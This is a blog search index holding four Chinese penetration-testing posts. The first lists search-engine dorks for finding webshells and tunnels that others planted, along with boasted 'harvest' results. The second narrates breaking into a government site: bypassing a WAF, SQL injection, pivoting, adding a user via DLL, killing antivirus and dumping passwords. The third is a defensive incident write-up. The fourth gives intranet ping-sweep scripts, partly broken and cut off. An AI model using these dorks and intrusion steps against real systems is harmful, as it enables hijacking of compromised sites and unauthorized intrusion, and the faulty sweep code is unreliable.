<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[搜索引擎及爆菊总结]]></title>
      <url>http://www.warmeng.com/2018/11/25/bj/</url>
      <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最开始是想收集一下最快互联网最快getshell的方法，但是后面在实际的操作过程中发现了不少坑，最后只能当作总结一下搜索引擎攻击方式吧，平时也能练练手。</p>
<a id="more"></a>
<h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">https://www.freebuf.com/column/186093.html</div><div class="line">https://fofa.so/</div><div class="line">http://www.google.com/</div><div class="line">https://thief.one/2017/05/19/1/</div></pre></td></tr></table></figure>
<h2 id="一-谷歌专用"><a href="#一-谷歌专用" class="headerlink" title="一.谷歌专用"></a>一.谷歌专用</h2><h3 id="GOOGLE基本语法"><a href="#GOOGLE基本语法" class="headerlink" title="GOOGLE基本语法"></a>GOOGLE基本语法</h3><p>Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中。</p>
<p>intext:　　将返回所有在网页正文部分包含关键词的网页。</p>
<p>intitle:　　将返回所有网页标题中包含关键词的网页。</p>
<p>cache:　　搜索google里关于某些内容的缓存。</p>
<p>define:　　搜索某个词语的定义。</p>
<p>filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等。</p>
<p>info:　　查找指定站点的一些基本信息。</p>
<p>inurl:　　搜索我们指定的字符是否存在于URL中。</p>
<p>Link:　　link:thief.one可以返回所有和thief.one做了链接的URL。</p>
<p>site:　　site:thief.one将返回所有和这个站有关的URL。</p>
<p>+　　把google可能忽略的字列如查询范围。</p>
<p>-　　把某个字忽略，例子：新加 -坡。</p>
<p>~　　同意词。</p>
<p>.　　单一的通配符。</p>
<p>*　　通配符，可代表多个字母。</p>
<p>“”　　精确查询。</p>
<h3 id="GOOGLE爆菊专用"><a href="#GOOGLE爆菊专用" class="headerlink" title="GOOGLE爆菊专用"></a>GOOGLE爆菊专用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">intitle:☆銥繎夶蟲___Ёnd</div><div class="line">Intitle:FSO文件浏览器</div><div class="line">inurl:tunnel.php?intext:Georg says, &apos;All seems fine&apos;</div><div class="line">inurl:tunnel.aspx?intext:Georg says, &apos;All seems fine&apos;</div><div class="line">inurl:tunnel.nosocket.php?intext:Georg says, &apos;All seems fine&apos;</div><div class="line">inurl:tunnel.ashx?intext:Georg says, &apos;All seems fine&apos;</div><div class="line">inurl:.php?intext:Georg says, &apos;All seems fine&apos;</div><div class="line">inurl:.asp?intitle:r00ts小组</div><div class="line">inurl:.jsp?intitle:※Jspspy web</div><div class="line">inurl:.jsp?intitle:孤水绕城</div><div class="line">inurl:ma1.jsp?intitle:[FC※HK]</div><div class="line">inurl:.jsp?intitle:jshell</div><div class="line">inurl:.txt?intext:Hacked by</div><div class="line">inurl:.jsp?intext:by 慈勤强</div></pre></td></tr></table></figure>
<h2 id="fofa语法及fofa专用"><a href="#fofa语法及fofa专用" class="headerlink" title="fofa语法及fofa专用"></a>fofa语法及fofa专用</h2><h3 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h3><p>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。</p>
<p>header=”abc” 从http头中搜索abc。例：jboss服务器。</p>
<p>body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。</p>
<p>domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</p>
<p>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</p>
<p>port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</p>
<p>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</p>
<p>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</p>
<p>city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</p>
<p>region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</p>
<p>country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</p>
<p>cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</p>
<h3 id="fofa爆菊"><a href="#fofa爆菊" class="headerlink" title="fofa爆菊"></a>fofa爆菊</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">body=&quot;Error: username or password error,please input again&quot;</div><div class="line">body=&quot;Directory listing for&quot;||title=&quot;index of /&quot;||body=&quot;转到父目录&quot;</div><div class="line">body=&quot;ExtWebModels&quot;</div><div class="line">body=&quot;Error: username or password error,please input again&quot;</div><div class="line">(body=&quot;xxl-job-admin&quot;||body=&quot;&lt;a&gt;&lt;b&gt;XXL&lt;/b&gt;JOB&lt;/a&gt;&quot;)&amp;&amp;body=&quot;任务调度中心&quot;</div><div class="line">app=&quot;Adobe-ColdFusion&quot;</div><div class="line">app=&quot;MetInfo&quot;</div></pre></td></tr></table></figure>
<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><h3 id="钟馗之眼语法"><a href="#钟馗之眼语法" class="headerlink" title="钟馗之眼语法"></a>钟馗之眼语法</h3><p>app:nginx　　组件名</p>
<p>ver:1.0　　版本</p>
<p>os:windows　　操作系统</p>
<p>country:　　国家</p>
<p>city:　　城市</p>
<p>port:80　　端口</p>
<p>hostname:google　　主机名</p>
<p>site:　　网站域名</p>
<p>desc:　　描述</p>
<p>keywords:　　关键词</p>
<p>service:ftp　　服务类型</p>
<p>ip:8.8.8.8　　ip地址</p>
<p>cidr:8.8.8.8/24　　ip地址段</p>
<h2 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h2><h3 id="censys语法"><a href="#censys语法" class="headerlink" title="censys语法"></a>censys语法</h3><p><a href="https://www.censys.io/certificates/help" target="_blank" rel="external">https://www.censys.io/certificates/help</a> 帮助文档</p>
<p><a href="https://www.censys.io/ipv4?q=" target="_blank" rel="external">https://www.censys.io/ipv4?q=</a>  ip查询</p>
<p><a href="https://www.censys.io/domain?q=" target="_blank" rel="external">https://www.censys.io/domain?q=</a>  域名查询</p>
<p><a href="https://www.censys.io/certificates?q=" target="_blank" rel="external">https://www.censys.io/certificates?q=</a> 证书查询</p>
<p>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not</p>
<p>80.http.get.status_code: 200　　指定状态</p>
<p>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</p>
<p>location.country_code: DE　　国家</p>
<p>protocols: (“23/telnet” or “21/ftp”)　　协议</p>
<p>tags: scada　　标签</p>
<p>80.http.get.headers.server：nginx　　服务器类型版本</p>
<p>autonomous_system.description: University　　系统描述</p>
<h2 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h2><h3 id="shodan语法"><a href="#shodan语法" class="headerlink" title="shodan语法"></a>shodan语法</h3><p>hostname：　　搜索指定的主机或域名，例如 hostname:”google”</p>
<p>port：　　搜索指定的端口或服务，例如 port:”21”</p>
<p>country：　　搜索指定的国家，例如 country:”CN”</p>
<p>city：　　搜索指定的城市，例如 city:”Hefei”</p>
<p>org：　　搜索指定的组织或公司，例如 org:”google”</p>
<p>isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”</p>
<p>product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</p>
<p>version：　　搜索指定的软件版本，例如 version:”1.6.2”</p>
<p>geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”</p>
<p>before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”</p>
<p>net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</p>
<h2 id="爆菊成果截图"><a href="#爆菊成果截图" class="headerlink" title="爆菊成果截图"></a>爆菊成果截图</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;收获其实还可以，这里贴几张图。</p>
<p><img src="/images/20181125/1.png" alt=""></p>
<p><img src="/images/20181125/2.png" alt=""></p>
<p><img src="/images/20181125/3.png" alt=""></p>
<p><img src="/images/20181125/4.png" alt=""></p>
<p><img src="/images/20181125/5.png" alt=""></p>
<p><img src="/images/20181125/6.png" alt=""></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;说来可笑，最初的目的是用regeorg的信息，达到最快日站的方式，但是真的获取该页面转入内网的时候突然发现自己不知道下一步什么做什么，结果还是要一点一点地收集信息，速度依旧很慢，不过在爆菊的结果看来有些学校被外国人占领，不少的外国政府网站被中国人占领，哈哈。最后借着这次机会借用下前辈们的文章总结一下搜索引擎吧。</p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[随笔记录一篇]]></title>
      <url>http://www.warmeng.com/2018/07/18/SBjl/</url>
      <content type="html"><![CDATA[<p>  方法都是前辈们的老方法，碰巧遇到个案例能将这些之前看到的老方法组合利用一波。确实能让人体会渗透的魅力。感谢那些分享方法的前辈们，让我们这小脚本小子得以生存QAQ</p>
<a id="more"></a>
<h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.t00ls.net/viewthread.php?tid=42975</div><div class="line">https://www.t00ls.net/viewthread.php?tid=44032</div></pre></td></tr></table></figure>
<h2 id="一-加速乐-amp-真实IP"><a href="#一-加速乐-amp-真实IP" class="headerlink" title="一.加速乐&amp;真实IP"></a>一.加速乐&amp;真实IP</h2><p>  在项目中的一个gov网站，随便输入个特殊字符就被加速乐给拦截了。<br><img src="/images/20180718/1.png" alt=""><br>  这玩意已经见太多了，见怪不怪。找真实IP呗。从邮箱子域名处找C段找到了真实IP。但是这里好巧不巧的就有邮箱订阅的功能，于是来试试。<br><img src="/images/20180718/2.png" alt=""><br>  订阅之后，到点接收，点击显示邮件原文。<br><img src="/images/20180718/3.png" alt=""><br>  得到真实IP，发现直接IP并不能访问网站，故而绑定hosts。<br><img src="/images/20180718/4.png" alt=""><br>  之后成功收获一枚SQL注入，并且能够访问被加速乐进行防护的网站后台<br><img src="/images/20180718/5.png" alt=""><br>  regeorg转入内网</p>
<h2 id="二-445"><a href="#二-445" class="headerlink" title="二.445"></a>二.445</h2><p>  转入内网之后，对邮箱子域名的那台服务器渗透，发现445。但是msf连接不上，再使用nsa工具包注入dll时也回连失败。<br><img src="/images/20180718/6.jpg" alt=""><br>  听说是有瑞星杀毒的。此时想到了上次在tools看到的小工具，dll生成。由于该服务器3389是打开的，那直接生成net uer add命令的dll吧。<br><img src="/images/20180718/7.png" alt=""><br>  成功使用创建的用户名密码登录服务器。发现果然有瑞星杀毒。想要关闭此杀毒进行getpass操作，但是发现需要输入密码，并且task kill与任务管理器都关闭无效。<br><img src="/images/20180718/9.png" alt=""><br>  使用冰剑无效，使用pchunter强制关闭成功，感激pchunter！<br><img src="/images/20180718/10.png" alt=""><br>  接下来，getpassword，再之后该干嘛干嘛了。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  随笔一篇，其实初衷是为了tools季度限号，其次再是对那些分享自己宝贵经验的致以诚挚的感谢！</p>
]]></content>
      
        <categories>
            
            <category> getshell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一次奇怪的暗链排查经历]]></title>
      <url>http://www.warmeng.com/2018/05/31/YJ/</url>
      <content type="html"><![CDATA[<p>知道创宇盾监测到某政府网站存在暗链，监测报告发出去之后，才发现事情没有那么简单。</p>
<a id="more"></a>
<h2 id="初始事件"><a href="#初始事件" class="headerlink" title="初始事件"></a>初始事件</h2><p>  某平台对某gov政府实时监测，突然预警，存在暗链，并且将地址直接爆出来：<a href="http://www.XXXX.gov.cn/qlwbsnmxb/54225.html。" target="_blank" rel="external">http://www.XXXX.gov.cn/qlwbsnmxb/54225.html。</a><br>对其进行访问，直接跳转至博彩网站，如下图所示：<br><img src="/images/20180531/1.png" alt=""><br><img src="/images/20180531/2.png" alt=""><br><img src="/images/20180531/3.png" alt=""><br>我和我的小伙伴惊呆了，当时出的结论是后台沦陷？服务器沦陷？未授权访问的编辑器可以上传html？于是给的关停整改的一系列建议。</p>
<h2 id="事件发酵"><a href="#事件发酵" class="headerlink" title="事件发酵"></a>事件发酵</h2><p>  监测方and被监测方and我，人隔三地。这个时候，被监测方说，他们访问是404，并没有暗链的页面。但是，当时我和我的小伙伴都能发生跳转的。而且令人奇怪的事情是：<br>根目录下是正常的，出现暗链的页面明显在一个二级目录下面，这他妈不是妥妥的被黑掉了嘛？与被监测方沟通，让他们检查源码，覆盖备份等方式去监测是否服务器沦陷。<br>但是最终结果是服务器的的确确是安全的？难道dns劫持？流量劫持？限制ip？有点懵逼了已经。ip138查询该网站的IP地址为47.75.XX.XX，香港阿里云。<br><img src="/images/20180531/4.png" alt=""><br>而他们的网站真实IP应该是61.xx.xx.xx。我再询问，是否是域名服务商出问题了，他们说也完全没有问题。我已经懵逼了，为什么根目录是好的网站，二级目录下面的暗链不存在？</p>
<h2 id="事件推理"><a href="#事件推理" class="headerlink" title="事件推理"></a>事件推理</h2><p>  咨询大佬，大佬给的结论是dns劫持，当时的想法是，根目录下是真的网站，dns劫持不是应该全部劫持嘛？纠结住了。我在绑定了hosts文件后，发现在访问那个暗链的html真的404了。<br>卧槽，这他妈是什么情况？<br><img src="/images/20180531/5.png" alt=""><br>与小伙伴讨论，小伙伴也惊呆了，猜测的结论是域名服务商的账号被搞了，域名绑定到别的IP地址，采用nginx反向代理。但是被监测方他说域名服务商没有问题。<br><img src="/images/20180531/6.png" alt=""><br>em….好吧，我们开始nslookup、微步在线情报分析、dig @+trace，发现了一条比较奇怪的cname值：XXXgov.com.amdc6676.net。如图所示：<br><img src="/images/20180531/7.png" alt=""><br><img src="/images/20180531/8.png" alt=""><br><img src="/images/20180531/9.png" alt=""><br>针对这个咨询大佬。大佬给了肯定的答复！<br><img src="/images/20180531/10.png" alt=""><br>那这就应该是被人改掉了，cname的值。域名服务商管理平台那里的事情，再与被监测方沟通。此时眉目初现。<br><img src="/images/20180531/11.png" alt=""></p>
<h2 id="事件尾声"><a href="#事件尾声" class="headerlink" title="事件尾声"></a>事件尾声</h2><p>  领导问，为什么验证的时候说下结论说是有暗链，是沦陷。当时我就怂了，但是这个锅确实是我的错误，赶紧背锅QAQ。次日，被监测方检查完毕，如图所示：<br><img src="/images/20180531/12.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  虽然犯错了，但是我觉得整个事件还是挺有意义，我这条小菜鸡在这个事件中受益匪浅。</p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 攻略 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ping命令快速探测]]></title>
      <url>http://www.warmeng.com/2018/03/03/ping/</url>
      <content type="html"><![CDATA[<p>route print有的时候没有任何显示，内网存活其实是下一步攻击的关键。</p>
<p>搜罗搜罗，弄出一个python ping命令探测。但是总感觉有点不对劲。说不出来，求路过大佬指点。</p>
<a id="more"></a>
<h1 id="PING1-py"><a href="#PING1-py" class="headerlink" title="PING1.py"></a>PING1.py</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>randomIP生成20000条ip进行内网ip筛选，perfectIP遍历所有的内网IP地址，采用携程的方式，但是出了点小状况，会失控会跑死，还在改进中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line">from random import sample</div><div class="line">from multiprocessing import Process</div><div class="line">import gevent</div><div class="line">from gevent import monkey</div><div class="line">from tasks_teach import verbose_ping</div><div class="line">monkey.patch_all()</div><div class="line"></div><div class="line"></div><div class="line">def randomIP():</div><div class="line">    a = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, 20000):</div><div class="line">        numbers = sample(range(1, 255), 4)</div><div class="line">        <span class="keyword">if</span> numbers[0] == 10:</div><div class="line">            randomR = <span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</div><div class="line">            a.append(randomR)</div><div class="line">        <span class="keyword">if</span> numbers[0] == 172 and numbers[1]&gt;=16 and numbers[1]&lt;=31:</div><div class="line">            randomR = <span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</div><div class="line">            a.append(randomR)</div><div class="line">        <span class="keyword">if</span> numbers[0] == 192 and numbers[1] == 168:</div><div class="line">            randomR = <span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</div><div class="line">            a.append(randomR)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pass</div><div class="line">    <span class="built_in">return</span> a</div><div class="line"></div><div class="line"></div><div class="line">def predictIP():</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="string">'10.'</span>, <span class="string">'172.'</span>, <span class="string">'192.168.'</span>):</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> (<span class="string">'10.'</span>, <span class="string">'172.'</span>):</div><div class="line">            numbers = sample(range(1, 255), 3)</div><div class="line">            IP = i + <span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</div><div class="line">            <span class="built_in">print</span>(IP)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            numbers = sample(range(1, 255), 2)</div><div class="line">            IP = i + <span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</div><div class="line">            <span class="built_in">print</span>(IP)</div><div class="line"></div><div class="line"></div><div class="line">def perfectIP():</div><div class="line">    bb = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="string">'10'</span>, <span class="string">'172'</span>, <span class="string">'192.168'</span>):</div><div class="line">        <span class="keyword">if</span> i == <span class="string">'10'</span>:</div><div class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> range(0, 255):</div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(0, 255):</div><div class="line">                    <span class="keyword">for</span> d <span class="keyword">in</span> (1, 254, 255):</div><div class="line">                        seq = (i, b, c, d)</div><div class="line">                        bb.append(<span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> seq))</div><div class="line">        <span class="keyword">if</span> i == <span class="string">'172'</span>:</div><div class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> range(16,31):</div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(0,255):</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span> i == <span class="string">'192.168'</span>:</div><div class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(0, 255):</div><div class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> (1, 254, 255):</div><div class="line">                    seq = (i, c, d)</div><div class="line">                    bb.append(<span class="string">'.'</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> seq))</div><div class="line">    <span class="built_in">return</span> bb</div><div class="line"></div><div class="line">def doping(ip):</div><div class="line">    verbose_ping(ip, 2, 1)</div><div class="line"></div><div class="line">def process_start(ips):</div><div class="line">    tasks = []</div><div class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</div><div class="line">        tasks.append(gevent.spawn(doping, ip))</div><div class="line">    gevent.joinall(tasks)</div><div class="line"></div><div class="line">def tasks_start(ips, flag=100):</div><div class="line"></div><div class="line">    ip_list = []</div><div class="line">    i = 0</div><div class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</div><div class="line">        i += 1</div><div class="line">        ip_list.append(ip)</div><div class="line">        <span class="keyword">if</span> i == flag:</div><div class="line">            p = Process(target=process_start, args=(ip_list,))</div><div class="line">            p.start()</div><div class="line">            ip_list = []</div><div class="line">            i = 0</div><div class="line">    <span class="keyword">if</span> len(ip_list) != 0:</div><div class="line">        p = Process(target=process_start, args=(ip_list,))</div><div class="line">        p.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    tasks_start(perfectIP())</div></pre></td></tr></table></figure></p>
<h2 id="PING2-py"><a href="#PING2-py" class="headerlink" title="PING2.py"></a>PING2.py</h2><p>python构造icmp包探测存活</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line">import os, sys, socket, struct, select, time</div><div class="line"></div><div class="line">ICMP_ECHO_REQUEST = 8 </div><div class="line">def checksum(source_string):</div><div class="line"> </div><div class="line">  sum = 0</div><div class="line">  countTo = (len(source_string)/2)*2</div><div class="line">  count = 0</div><div class="line">  <span class="keyword">while</span> count&lt;countTo:</div><div class="line">    thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])</div><div class="line">    sum = sum + thisVal</div><div class="line">    sum = sum &amp; 0xffffffff </div><div class="line">    count = count + 2</div><div class="line">  <span class="keyword">if</span> countTo&lt;len(source_string):</div><div class="line">    sum = sum + ord(source_string[len(source_string) - 1])</div><div class="line">    sum = sum &amp; 0xffffffff </div><div class="line">  sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff)</div><div class="line">  sum = sum + (sum &gt;&gt; 16)</div><div class="line">  answer = ~sum</div><div class="line">  answer = answer &amp; 0xffff</div><div class="line"></div><div class="line">  answer = answer &gt;&gt; 8 | (answer &lt;&lt; 8 &amp; 0xff00)</div><div class="line">  <span class="built_in">return</span> answer</div><div class="line">def receive_one_ping(my_socket, ID, timeout):</div><div class="line"></div><div class="line">  timeLeft = timeout</div><div class="line">  <span class="keyword">while</span> True:</div><div class="line">    startedSelect = time.time()</div><div class="line">    whatReady = select.select([my_socket], [], [], timeLeft)</div><div class="line">    howLongInSelect = (time.time() - startedSelect)</div><div class="line">    <span class="keyword">if</span> whatReady[0] == []: <span class="comment"># Timeout</span></div><div class="line">      <span class="built_in">return</span></div><div class="line">    timeReceived = time.time()</div><div class="line">    recPacket, addr = my_socket.recvfrom(1024)</div><div class="line">    icmpHeader = recPacket[20:28]</div><div class="line">    <span class="built_in">type</span>, code, checksum, packetID, sequence = struct.unpack(</div><div class="line">      <span class="string">"bbHHh"</span>, icmpHeader</div><div class="line">    )</div><div class="line">    <span class="keyword">if</span> packetID == ID:</div><div class="line">      bytesInDouble = struct.calcsize(<span class="string">"d"</span>)</div><div class="line">      timeSent = struct.unpack(<span class="string">"d"</span>, recPacket[28:28 + bytesInDouble])[0]</div><div class="line">      <span class="built_in">return</span> timeReceived - timeSent</div><div class="line">    timeLeft = timeLeft - howLongInSelect</div><div class="line">    <span class="keyword">if</span> timeLeft &lt;= 0:</div><div class="line">      <span class="built_in">return</span></div><div class="line">def send_one_ping(my_socket, dest_addr, ID):</div><div class="line"></div><div class="line">  dest_addr = socket.gethostbyname(dest_addr)</div><div class="line"> </div><div class="line">  my_checksum = 0</div><div class="line"></div><div class="line">  header = struct.pack(<span class="string">"bbHHh"</span>, ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)</div><div class="line"></div><div class="line">  bytesInDouble = struct.calcsize(<span class="string">"d"</span>)</div><div class="line">  data = (192 - bytesInDouble) * <span class="string">"Q"</span></div><div class="line">  data = struct.pack(<span class="string">"d"</span>, time.time()) + data</div><div class="line"></div><div class="line">  my_checksum = checksum(header + data)</div><div class="line"></div><div class="line">  header = struct.pack(<span class="string">"bbHHh"</span>, ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1)</div><div class="line">  packet = header + data</div><div class="line">  my_socket.sendto(packet, (dest_addr, 1)) </div><div class="line">def do_one(dest_addr, timeout):</div><div class="line"></div><div class="line">  icmp = socket.getprotobyname(<span class="string">"icmp"</span>)</div><div class="line">  try:</div><div class="line">    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)</div><div class="line">  except socket.error, (errno, msg):</div><div class="line">    <span class="keyword">if</span> errno == 1:</div><div class="line"></div><div class="line">      msg = msg + (</div><div class="line">        <span class="string">" - Note that ICMP messages can only be sent from processes"</span></div><div class="line">        <span class="string">" running as root."</span></div><div class="line">      )</div><div class="line">      raise socket.error(msg)</div><div class="line">    raise </div><div class="line">  my_ID = os.getpid() &amp; 0xFFFF</div><div class="line">  send_one_ping(my_socket, dest_addr, my_ID)</div><div class="line">  delay = receive_one_ping(my_socket, my_ID, timeout)</div><div class="line">  my_socket.close()</div><div class="line">  <span class="built_in">return</span> delay</div><div class="line">def verbose_ping(dest_addr, timeout = 2, count = 100):</div><div class="line"></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(count):</div><div class="line">    <span class="built_in">print</span> <span class="string">"ping %s...\n"</span> % dest_addr,</div><div class="line">    try:</div><div class="line">      delay = do_one(dest_addr, timeout)</div><div class="line">    except socket.gaierror, e:</div><div class="line">      <span class="built_in">print</span> <span class="string">"failed. (socket error: '%s')"</span> % e[1]</div><div class="line">      <span class="built_in">break</span></div><div class="line">    <span class="keyword">if</span> delay == None:</div><div class="line">      <span class="built_in">print</span> <span class="string">"failed. (timeout within %ssec.)"</span> % timeout</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      delay = delay * 1000</div><div class="line">      <span class="built_in">print</span> <span class="string">"get ping in %0.4fms"</span> % delay</div><div class="line"><span class="comment"># if __name__ == '__main__':</span></div><div class="line"><span class="comment">#   